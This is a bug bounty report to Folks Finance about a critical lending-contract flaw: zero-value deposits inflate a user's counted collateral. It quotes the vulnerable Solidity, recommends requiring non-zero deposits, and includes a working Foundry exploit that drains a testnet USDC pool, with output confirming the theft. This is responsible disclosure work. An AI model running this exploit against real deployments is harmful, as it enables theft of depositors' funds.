# Boost \_ Folks Finance 33780 - \[Smart Contract - Critical] Zero deposits can be used to artificially

Submitted on Mon Jul 29 2024 08:52:14 GMT-0400 (Atlantic Standard Time) by @JCN2023 for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33780

Report type: Smart Contract

Report severity: Critical

Target: <https://testnet.snowtrace.io/address/0xf8E94c5Da5f5F23b39399F6679b2eAb29FE3071e>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A malicious user can leverage null deposits to artificially expand the number of their open collateral positions for a specific `poolId`. They can then perform a valid deposit, which will result in their total collateral value equaling `actual_deposit * num_open_positions_poolId`. This allows the malicious user to then borrow an excessive amount since their collateral value has been inflated. With proper inputs and enough capital (or leveraging flashloans), the malicious user can steal a large amount of funds from any pool (funds stolen will be capped by the `borrow cap` for each pool).

## Bug Description

Ignoring cross-chain components, the execution flow for deposits are as follows: `SpokeToken::deposit -> router/adapter/hub interactions -> LoanManager::deposit -> LoanManagerLogic::executeDeposit -> UserLoanLogic::increaseCollateral`.

The bug exists in the last step of the above flow:

[UserLoanLogic::increaseCollateral](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/logic/UserLoanLogic.sol#L20-L25)

```solidity
20:    function increaseCollateral(LoanManagerState.UserLoan storage loan, uint8 poolId, uint256 fAmount) external {
21:        // if the balance was prev zero, add pool to list of user loan collaterals
22:        if (loan.collaterals[poolId].balance == 0) loan.colPools.push(poolId);
23:
24:        loan.collaterals[poolId].balance += fAmount;
25:    }
```

As we can see above, the `increaseCollateral` function does not validate the `fAmount`. Therefore, this `fAmount` can be equal to 0 and if the user has not performed an actual deposit yet then line 22 will expand the user's collateral positions array by pushing the `poolId` to the array. A user can therefore perform multiple null deposits in order to push the `poolId` to their collateral positions array multiple times. The user can then perform a valid deposit, which will increase their collateral balance on line 24.

To understand how this enables the user to exploit the protocol we will look at the health check that is performed at the end of a borrow operation:

[LoanManagerLogic::executeBorrow](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/logic/LoanManagerLogic.sol#L301-L302)

```solidity
301:        if (!userLoan.isLoanOverCollateralized(pools, loanType.pools, oracleManager)) // @audit: health check -> compute total collateral value for borrower
302:            revert UnderCollateralizedLoan(params.loanId);
```

[UserLoanLogic::isLoanOverCollateralized](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/logic/UserLoanLogic.sol#L283-L290)

```solidity
283:    function isLoanOverCollateralized(
284:        LoanManagerState.UserLoan storage loan,
285:        mapping(uint8 poolId => IHubPool) storage pools,
286:        mapping(uint8 poolId => LoanManagerState.LoanPool) storage loanPools,
287:        IOracleManager oracleManager
288:    ) internal view returns (bool) {
289:        DataTypes.LoanLiquidityParams memory loanLiquidity = getLoanLiquidity(loan, pools, loanPools, oracleManager); // @audit: compute total collateral value for borrower
290:        return loanLiquidity.effectiveCollateralValue >= loanLiquidity.effectiveBorrowValue;
```

[UserLoanLogic::getLoanLiquidity](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/logic/UserLoanLogic.sol#L216-L245)

```solidity
216:    function getLoanLiquidity(
217:        LoanManagerState.UserLoan storage loan,
218:        mapping(uint8 => IHubPool) storage pools,
219:        mapping(uint8 => LoanManagerState.LoanPool) storage loanPools,
220:        IOracleManager oracleManager
221:    ) internal view returns (DataTypes.LoanLiquidityParams memory loanLiquidity) {
222:        // declare common variables
223:        uint256 effectiveValue;
224:        uint256 balance;
225:        uint8 poolId;
226:        uint256 poolsLength;
227:        DataTypes.PriceFeed memory priceFeed;
228:
229:        // calc effective collateral value
230:        poolsLength = loan.colPools.length; // @audit: num of open collateral positions
231:        for (uint8 i = 0; i < poolsLength; i++) {
232:            poolId = loan.colPools[i]; // @audit: same poolId loaded multiple times
233:
234:            balance = loan.collaterals[poolId].balance.toUnderlingAmount( // @audit: balance loaded for same poolId multiple times
235:                pools[poolId].getUpdatedDepositInterestIndex()
236:            );
237:            priceFeed = oracleManager.processPriceFeed(poolId);
238:            effectiveValue += MathUtils.calcCollateralAssetLoanValue(
239:                balance,
240:                priceFeed.price,
241:                priceFeed.decimals,
242:                loanPools[poolId].collateralFactor
243:            );
244:        }
245:        loanLiquidity.effectiveCollateralValue = effectiveValue; // @audit: collateral value = balance_poolId * num_positions_poolId
```

As we can see above, the `getLoanLiquidity` function will iterate over all of the open collateral positions for the user's loan and then sum the user's balance for each `poolId` seen in the array. If the user had previously performed 10 null deposits (prior to their actual deposit for `poolId`), then the same `poolId` will have been added to the array 11 times. Therefore, the user's collateral value for the `poolId` will effectively be multiplied by 11. This will allow the user to borrow much more than they should be able to.

## Impact

A malicious user can steal funds from any pool. However, note that the amount they can steal is bounded by the configured `borrow cap` for the pool.

## Recommended Mitigation

I would recommend requiring deposits to be greater than 0.

## Proof of concept

For simplicity, I have chosen to showcase how a user can drain a pool on the Hub chain by initiating operations on the Hub chain itself via the `HubAdapter`, and therefore all actions occur on one chain. However, note that a malicious user is able to perform this exploit via cross-chain operations as well.

To run foundry POC:

* add test file to `test/` directory of a foundry repo
* add `AVAX_FUJI_RPC_URL` variable as environment var or in `.env` file
* run test with `forge test --mc FolksPOC_StealFunds -vvv`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IHUB {
    function loanManager() external view returns (address);
}

interface IHubPool {
    function getPoolId() external view returns (uint8);
}

interface ISpoke {
    struct MessageParams {
        uint16 adapterId; 
        uint16 returnAdapterId; 
        uint256 receiverValue; 
        uint256 gasLimit; 
        uint256 returnGasLimit; 
    }

    function deposit(MessageParams memory params, bytes32 accountId, bytes32 loanId, uint256 amount) external payable;
    function createAccount(MessageParams memory params, bytes32 accountId, bytes32 refAccountId) external payable;
    function createLoan(MessageParams memory params, bytes32 accountId, bytes32 loanId, uint16 loanTypeId, bytes32 loanName) external payable;
    function borrow(MessageParams memory params, bytes32 accountId, bytes32 loanId, uint8 poolId, uint16 chainId, uint256 amount, uint256 maxStableRate) external payable;
}

interface ILoanManager {
    struct UserLoanCollateral {
        uint256 balance; 
        uint256 rewardIndex;
    }

    struct UserLoanBorrow {
        uint256 amount; 
        uint256 balance; 
        uint256 lastInterestIndex;
        uint256 stableInterestRate; 
        uint256 lastStableUpdateTimestamp; 
        uint256 rewardIndex;
    }

    function getUserLoan(bytes32 loanId) external view returns (
        bytes32,
        uint16,
        uint8[] memory,
        uint8[] memory,
        UserLoanCollateral[] memory,
        UserLoanBorrow[] memory
    );
}

contract FolksPOC_StealFunds is Test {
    uint256 avaxTestnetFork;

    string AVAX_FUJI_RPC_URL = vm.envString("AVAX_FUJI_RPC_URL");

    address constant USDC = 0x5425890298aed601595a70AB815c96711a31Bc65;

    address constant HUB_USDC_POOL = 0x1968237f3a7D256D08BcAb212D7ae28fEda72c34;

    address constant HUB = 0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140;

    address constant SPOKE_COMMON = 0x6628cE08b54e9C8358bE94f716D93AdDcca45b00;

    address constant SPOKE_CIRCLE_TOKEN = 0x89df7db4af48Ec7A84DE09F755ade9AF1940420b;

    function setUp() public {
        avaxTestnetFork = vm.createFork(AVAX_FUJI_RPC_URL);

        vm.selectFork(avaxTestnetFork);
    }

    function testStealFunds() public {
        // --- arbitrary block height for testing purposes --- //
        vm.rollFork(35069819);

        // --- set up hacker --- // 
        // hacker address
        address hacker = address(0x69420);
        
        // give hacker some starting usdc (can also leverage flashloan for initial capital requirement)
        uint256 hackerBalBefore = 100e6;
        deal(USDC, hacker, hackerBalBefore);

        // --- hacker first creates account and loan --- // 
        bytes32 accountId = bytes32(uint256(1111));
        bytes32 loanId = bytes32(uint256(2222));
        uint16 loanTypeId = 2;
        ISpoke.MessageParams memory params = ISpoke.MessageParams({ 
            adapterId: 1,
            returnAdapterId: 1,
            receiverValue: 0,
            gasLimit: 0,
            returnGasLimit: 0
        });
        
        // hacker creates account
        vm.startPrank(hacker);
        ISpoke(SPOKE_COMMON).createAccount(params, accountId, bytes32(0));
        
        // hacker creates loan
        ISpoke(SPOKE_COMMON).createLoan(params, accountId, loanId, loanTypeId, bytes32(0));

        // pool balance before exploit
        uint256 poolBalBefore = IERC20(USDC).balanceOf(HUB_USDC_POOL);

        // --- hacker performs null deposits to artificially expand their positions array and inflate deposit amount -- // 
        IERC20(USDC).approve(SPOKE_CIRCLE_TOKEN, hackerBalBefore);
        
        for (uint256 i; i < 20; i++) { // articifially extend their collateral positions array with 20 null deposits
            ISpoke(SPOKE_CIRCLE_TOKEN).deposit(params, accountId, loanId, 0);
        }
        
        ISpoke(SPOKE_CIRCLE_TOKEN).deposit(params, accountId, loanId, hackerBalBefore); // deposit initial balance

        // hacker's collateral is inflated
        {
            ILoanManager.UserLoanCollateral[] memory collaterals;
            uint256 totalCollateralAmount;
            address loanManager = IHUB(HUB).loanManager();

            (, , , , collaterals, ) = ILoanManager(loanManager).getUserLoan(loanId);
            
            for (uint256 i; i < collaterals.length; i++) {
                ILoanManager.UserLoanCollateral memory collateral = collaterals[i];
                totalCollateralAmount += collateral.balance;
            }

            assertEq(totalCollateralAmount, collaterals[0].balance * 21); // total collateral amount is valued 21 times more than their actual collateral deposit
        }

        // --- hacker borrows all tokens from the pool --- // 
        uint8 poolId = IHubPool(HUB_USDC_POOL).getPoolId();
        uint16 chainId =  1;
        ISpoke(SPOKE_COMMON).borrow(params, accountId, loanId, poolId, chainId, IERC20(USDC).balanceOf(HUB_USDC_POOL), uint256(0));
        vm.stopPrank();

        // pool balance after exploit
        uint256 poolBalAfter = IERC20(USDC).balanceOf(HUB_USDC_POOL);

        // hacker balance after exploit
        uint256 hackerBalAfter = IERC20(USDC).balanceOf(hacker);

        console.log("Hacker's balance before exploit: %s", hackerBalBefore);
        console.log("Pool's balance before exploit: %s", poolBalBefore);
        console.log("---");
        console.log("Hacker's balance after exploit: %s", hackerBalAfter);
        console.log("Pool's balance after exploit: %s", poolBalAfter);
    }
}
```

Output from test:

```js
Ran 1 test for test/FolksPOC_StealFunds.t.sol:FolksPOC_StealFunds
[PASS] testStealFunds() (gas: 5621522)
Logs:
  Hacker's balance before exploit: 100000000
  Pool's balance before exploit: 1387504545
  ---
  Hacker's balance after exploit: 1487504545
  Pool's balance after exploit: 0
```
